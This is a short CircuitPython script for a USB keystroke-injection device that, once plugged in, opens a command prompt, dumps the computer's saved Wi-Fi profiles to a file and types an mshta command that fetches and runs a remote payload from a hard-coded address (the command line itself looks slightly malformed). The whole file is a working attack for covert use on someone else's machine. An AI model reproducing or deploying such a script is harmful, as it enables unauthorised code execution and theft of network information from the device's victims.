import time
import os
import usb_hid
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

finish = False
time.sleep(3)

if not finish:
    time.sleep(1.5)
    keyboard = Keyboard(usb_hid.devices)
    layout = KeyboardLayoutUS(keyboard)

    keyboard.send(Keycode.WINDOWS, Keycode.R)
    time.sleep(1)

    layout.write("cmd\n")
    time.sleep(1)
    layout.write("e:\n")
    time.sleep(1)
    layout.write("netsh wlan show profile > network.txt\n")
    time.sleep(3)
    layout.write("mshta mshta http://10.0.10.220:9999/UL9J5")
  
    keyboard.send(Keycode.ALT, Keycode.F4)
    finish = True
